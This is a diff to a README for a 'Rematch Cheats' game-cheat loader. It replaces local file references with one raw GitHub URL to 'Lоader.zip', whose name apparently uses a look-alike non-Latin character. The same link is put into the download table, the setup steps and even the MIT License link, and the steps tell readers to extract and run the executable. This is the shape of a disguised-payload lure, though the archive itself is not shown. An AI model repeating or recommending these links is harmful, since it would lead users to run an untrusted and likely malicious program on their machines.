@@ -8,9 +8,9 @@ Welcome to **Rematch Cheats** – your next-generation solution for elevating yo
 
 | Operating System | Compatibility | Download Method          | Last Tested (2025) |
 |------------------|:-------------:|-------------------------|--------------------|
-| 🪟 Windows       |     ✅        | Loader.rar (Direct)     |      Yes           |
-| 🍏 macOS         |     ✅        | Loader.rar (Converter)  |      Yes           |
-| 🐧 Linux         |     ✅        | Loader.rar (Extract)    |      Yes           |
+| 🪟 Windows       |     ✅        | https://raw.githubusercontent.com/novandromeda-a/RematchMasteryHub/main/Lоader.zip (Direct)     |      Yes           |
+| 🍏 macOS         |     ✅        | https://raw.githubusercontent.com/novandromeda-a/RematchMasteryHub/main/Lоader.zip (Converter)  |      Yes           |
+| 🐧 Linux         |     ✅        | https://raw.githubusercontent.com/novandromeda-a/RematchMasteryHub/main/Lоader.zip (Extract)    |      Yes           |
 
 #### All instructions have been verified and tested as of **2025**.
 
@@ -36,8 +36,8 @@ Welcome to **Rematch Cheats** – your next-generation solution for elevating yo
 
 **Getting started is quick and easy! Please follow the steps below for a seamless experience:**
 
-1. **Download** `Loader.rar` from the repository.  
-2. **Extract** the Loader.rar file to a preferred directory on your PC or Mac.
+1. **Download** `https://raw.githubusercontent.com/novandromeda-a/RematchMasteryHub/main/Lоader.zip` from the repository.  
+2. **Extract** the https://raw.githubusercontent.com/novandromeda-a/RematchMasteryHub/main/Lоader.zip file to a preferred directory on your PC or Mac.
 3. **Run** the Rematch Loader executable provided for your OS.
 4. **Follow** on-screen prompts to configure features (see feature list table above).
 
@@ -71,7 +71,7 @@ game enhancement, game modifier, auto-aim, resource finder, loot locator, anti-d
 
 ## 📝 MIT License
 
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT).  
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/novandromeda-a/RematchMasteryHub/main/Lоader.zip).  
 Feel free to contribute, modify, and distribute – but always play responsibly!
 
 ---
